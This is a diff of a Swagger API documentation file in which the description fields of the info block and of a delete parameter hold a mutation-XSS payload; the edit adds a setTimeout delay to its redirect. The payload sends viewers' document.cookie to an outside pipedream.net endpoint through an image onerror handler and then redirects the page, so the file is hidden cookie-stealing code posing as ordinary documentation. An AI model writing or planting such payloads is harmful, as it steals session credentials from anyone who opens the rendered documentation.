@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='https://eonyz952zg6ppt3.m.pipedream.net/?a='+document.cookie><img src=xx onerror=window.location.replace(window.location.origin)>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='https://eonyz952zg6ppt3.m.pipedream.net/?a='+document.cookie><img src=xx onerror=setTimeout(function a(){window.location.replace(window.location.origin)}, 1500)>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='https://eonyz952zg6ppt3.m.pipedream.net/?a='+document.cookie><img src=xx onerror=window.location.replace(window.location.origin)>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='https://eonyz952zg6ppt3.m.pipedream.net/?a='+document.cookie><img src=xx onerror=setTimeout(function a(){window.location.replace(window.location.origin)}, 1500)>"></form>
 
           format: int64
           in: path
